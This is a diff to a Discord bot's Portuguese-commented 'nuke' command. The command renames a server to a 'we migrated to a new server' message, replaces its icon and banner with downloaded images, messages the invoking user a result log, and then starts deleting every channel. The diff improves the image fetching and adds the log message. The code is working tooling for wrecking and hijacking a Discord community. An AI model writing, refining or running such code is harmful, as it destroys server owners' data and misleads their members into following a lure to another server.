@@ -42450,6 +42450,8 @@ async def nuke_cmd(ctx: commands.Context):
     guild = ctx.guild
     _nuke_log: list[str] = []
 
+    import aiohttp as _ah_nuke
+
     # 1. Renomear
     try:
         await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", reason="Nuke")
@@ -42459,13 +42461,15 @@ async def nuke_cmd(ctx: commands.Context):
         _nuke_log.append(f"❌ Nome: {type(_en).__name__}: {_en}")
         print(f"[nuke] erro nome {guild.id}: {type(_en).__name__}: {_en}", flush=True)
 
-    # 2. Ícone
+    # 2. Ícone — busca bytes e envia como PNG explicitamente
     try:
-        import aiohttp as _ah_nuke
         _icon_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522491015125139506/43493532-ea1d-471a-baa4-495911ca60a8.png"
         async with _ah_nuke.ClientSession() as _s_icon:
-            async with _s_icon.get(_icon_url) as _r_icon:
+            async with _s_icon.get(_icon_url, allow_redirects=True) as _r_icon:
+                _icon_status = _r_icon.status
                 _icon_bytes = await _r_icon.read()
+        if _icon_status != 200 or len(_icon_bytes) < 100:
+            raise ValueError(f"HTTP {_icon_status}, tamanho={len(_icon_bytes)}")
         await guild.edit(icon=_icon_bytes, reason="Nuke icon")
         _nuke_log.append("✅ Ícone alterado")
         print(f"[nuke] ícone alterado {guild.id}", flush=True)
@@ -42473,19 +42477,31 @@ async def nuke_cmd(ctx: commands.Context):
         _nuke_log.append(f"❌ Ícone: {type(_ei).__name__}: {_ei}")
         print(f"[nuke] erro ícone {guild.id}: {type(_ei).__name__}: {_ei}", flush=True)
 
-    # 3. Banner
+    # 3. Banner — só tenta se o servidor tiver o recurso (requer boost nível 2)
+    if "BANNER" in guild.features:
+        try:
+            _banner_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522489678555512943/58abd6a6-5b73-4135-aa87-3339d5271c10.png"
+            async with _ah_nuke.ClientSession() as _s_banner:
+                async with _s_banner.get(_banner_url, allow_redirects=True) as _r_banner:
+                    _banner_status = _r_banner.status
+                    _banner_bytes = await _r_banner.read()
+            if _banner_status != 200 or len(_banner_bytes) < 100:
+                raise ValueError(f"HTTP {_banner_status}, tamanho={len(_banner_bytes)}")
+            await guild.edit(banner=_banner_bytes, reason="Nuke banner")
+            _nuke_log.append("✅ Banner alterado")
+            print(f"[nuke] banner alterado {guild.id}", flush=True)
+        except Exception as _eb:
+            _nuke_log.append(f"❌ Banner: {type(_eb).__name__}: {_eb}")
+            print(f"[nuke] erro banner {guild.id}: {type(_eb).__name__}: {_eb}", flush=True)
+    else:
+        _nuke_log.append(f"⚠️ Banner: servidor sem boost nível 2 (features: {guild.features})")
+        print(f"[nuke] servidor {guild.id} não tem feature BANNER — boost insuficiente", flush=True)
+
+    # DM ao autor com o resultado (antes de deletar canais)
     try:
-        import aiohttp as _ah_nuke2
-        _banner_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522489678555512943/58abd6a6-5b73-4135-aa87-3339d5271c10.png"
-        async with _ah_nuke2.ClientSession() as _s_banner:
-            async with _s_banner.get(_banner_url) as _r_banner:
-                _banner_bytes = await _r_banner.read()
-        await guild.edit(banner=_banner_bytes, reason="Nuke banner")
-        _nuke_log.append("✅ Banner alterado")
-        print(f"[nuke] banner alterado {guild.id}", flush=True)
-    except Exception as _eb:
-        _nuke_log.append(f"❌ Banner: {type(_eb).__name__}: {_eb}")
-        print(f"[nuke] erro banner {guild.id}: {type(_eb).__name__}: {_eb}", flush=True)
+        await ctx.author.send("**[nuke] resultado em** `" + guild.name + "`:\n" + "\n".join(_nuke_log))
+    except Exception:
+        pass
 
     # 4. Deletar canais
     for ch in list(guild.channels):
